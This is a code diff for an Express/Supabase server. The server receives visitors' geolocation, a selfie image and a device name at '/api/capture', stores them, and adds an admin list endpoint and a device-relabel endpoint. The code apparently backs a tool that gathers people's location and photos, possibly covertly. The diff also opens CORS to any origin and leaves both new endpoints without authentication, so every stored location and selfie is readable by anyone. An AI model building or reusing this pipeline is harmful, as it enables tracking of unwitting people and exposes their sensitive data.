@@ -6,9 +6,9 @@ const PORT = process.env.PORT || 10000;
 app.use(express.json({ limit: '10mb' }));
 
 app.use((req, res, next) => {
-  res.header('Access-Control-Allow-Origin', 'https://eazyshaw191-web.github.io');
+  res.header('Access-Control-Allow-Origin', '*');
   res.header('Access-Control-Allow-Headers', 'Content-Type');
-  res.header('Access-Control-Allow-Methods', 'POST');
+  res.header('Access-Control-Allow-Methods', 'GET, POST, PATCH, OPTIONS');
   if (req.method === 'OPTIONS') return res.sendStatus(200);
   next();
 });
@@ -18,9 +18,10 @@ const supabase = createClient(
   process.env.SUPABASE_SERVICE_KEY
 );
 
+// --- Save a new capture ---
 app.post('/api/capture', async (req, res) => {
   try {
-    const { location, selfie, timestamp } = req.body;
+    const { location, selfie, timestamp, deviceName } = req.body;
     let selfieUrl = null;
 
     if (selfie) {
@@ -41,15 +42,54 @@ app.post('/api/capture', async (req, res) => {
       selfieUrl = publicUrlData.publicUrl;
     }
 
-    console.log('--- New Submission ---');
-    console.log('Time:', timestamp);
-    console.log('Location:', location?.lat, location?.lng);
-    console.log('Selfie URL:', selfieUrl);
+    const { data: inserted, error: insertError } = await supabase
+      .from('captures')
+      .insert({
+        device_name: deviceName || 'Unknown device',
+        lat: location?.lat ?? null,
+        lng: location?.lng ?? null,
+        accuracy: location?.accuracy ?? null,
+        selfie_url: selfieUrl,
+        created_at: timestamp || new Date().toISOString()
+      })
+      .select()
+      .single();
 
-    const mapUrl = location ? `https://www.google.com/maps?q=${location.lat},${location.lng}` : null;
-    res.json({ success: true, selfieUrl, mapUrl });
+    if (insertError) throw insertError;
+
+    res.json({ success: true, selfieUrl, id: inserted.id });
   } catch (err) {
     console.error('Error:', err.message);
+    res.status(500).json({ success: false, error: err.message });
+  }
+});
+
+// --- List all captures (for admin) ---
+app.get('/api/captures', async (req, res) => {
+  try {
+    const { data, error } = await supabase
+      .from('captures')
+      .select('*')
+      .order('created_at', { ascending: false });
+    if (error) throw error;
+    res.json({ success: true, data });
+  } catch (err) {
+    res.status(500).json({ success: false, error: err.message });
+  }
+});
+
+// --- Rename a device ---
+app.patch('/api/captures/:id', async (req, res) => {
+  try {
+    const { id } = req.params;
+    const { device_label } = req.body;
+    const { error } = await supabase
+      .from('captures')
+      .update({ device_label })
+      .eq('id', id);
+    if (error) throw error;
+    res.json({ success: true });
+  } catch (err) {
     res.status(500).json({ success: false, error: err.message });
   }
 });
